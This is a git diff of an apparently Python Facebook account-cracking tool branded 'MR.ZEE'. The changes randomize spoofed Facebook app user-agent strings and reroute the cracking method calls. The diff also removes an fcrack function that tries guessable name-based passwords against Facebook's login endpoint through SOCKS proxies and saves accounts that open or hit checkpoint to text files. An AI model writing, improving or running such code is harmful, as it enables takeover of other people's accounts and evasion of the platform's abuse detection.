@@ -362,7 +362,7 @@ def m1(ids,passlist):
                         fbrv = '0'
                         fban = 'FB4A'
                         fbpn = 'com.facebook.katana'
-                        ua = 'Dalvik/2.1.0 (Linux; U; Android 10.0.0; SM-G920F Build/MMB29K) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
+                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -453,7 +453,7 @@ def m2(ids,passlist):
                         fbrv = '0'
                         fban = 'FB4A'
                         fbpn = 'com.facebook.katana'
-                        ua = 'Dalvik/2.1.0 (Linux; U; Android 10.0.0; Infinix Build/R16NM) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/Telenor;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix;FBSV/10.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.5,width=720,height=1280};FB_FW/1;]'
+                        ua = 'Davik/2.1.0 (Linux; U; Android 11.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -606,7 +606,7 @@ def gmail():
                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                         linex()
                         for user in fo:
-                                uid,names = user.split('|')
+                                ids,names = user.split('|')
                                 first_name = names.rsplit(' ')[0]
                                 try:
                                         last_name = names.rsplit(' ')[1]
@@ -616,9 +616,9 @@ def gmail():
                                 ls = last_name.lower()
                                 pwx = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                 if mthd in ['1','01']:	
-                                	yaari.submit(ffb,ids,passlist)
+                                	yaari.submit(m1,ids,passlist)
                                 elif mthd in ['2','02']:
-                                    yaari.submit(fcrack,uid,pwx,tl)
+                                    yaari.submit(m2,ids,passlist)
                                 else:
                                     yaari.submit(mmmm,ids,names,passlist)
                 print('\033[1;37m')
@@ -878,67 +878,6 @@ def chos():
     linex()
 
 #_
-
-def fcrack(uid,pwx,tl):
-	#print(user)
-	global loop
-	global cps
-	global oks
-	global ugen
-	try:
-		for ps in pwx:
-			session = requests.Session()
-			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.ZEE\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
-			sys.stdout.flush()
-			ua = random.choice(ugen)
-			nip=random.choice(prox)
-			proxs= {'http': 'socks4://'+nip}
-			free_fb = session.get('https://x.facebook.com').text
-			log_data = {
-				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-			"try_number":"0",
-			"unrecognized_tries":"0",
-			"email":uid,
-			"pass":ps,
-			"login":"Log In"}
-			header_freefb = {'host': 'm.facebook.com',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-language': 'en-US,en;q=0.9',
-    			'cache-control': 'max-age=0',
-			'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
-    			'sec-ch-ua-mobile': '?1',
-    			'sec-ch-ua-platform': '"Android"',
-    			'sec-fetch-dest': 'document',
-    			'sec-fetch-mode': 'navigate',
-    			'sec-fetch-site': 'none',
-    			'sec-fetch-user': '?1',
-			'upgrade-insecure-requests': '1',
-    			'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36',}
-			lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-			log_cookies=session.cookies.get_dict().keys()
-			#print(iid+'|'+pws+'|'+str(log_cookies))
-			if 'c_user' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[151:166]
-				print('\033[1;92m[ZEE-OK] '+cid+' | '+ps+'\033[1;32m')
-				open('ZEE-ok.txt', 'a').write(cid+' | '+ps+'\n')
-				oks.append(cid)
-				break
-			elif 'checkpoint' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[141:156]
-				print('\33[1;31m[ZEE-CP] '+cid+' | '+ps+'\33[0;97m')
-				open('ZEE-cp.txt', 'a').write(cid+' | '+ps+'\n')
-				cps.append(cid)
-				break
-			else:
-				continue
-		loop+=1
-	except:
-		pass
 
 def ffb(ids,names,passlist):
         global loop,oks,cps
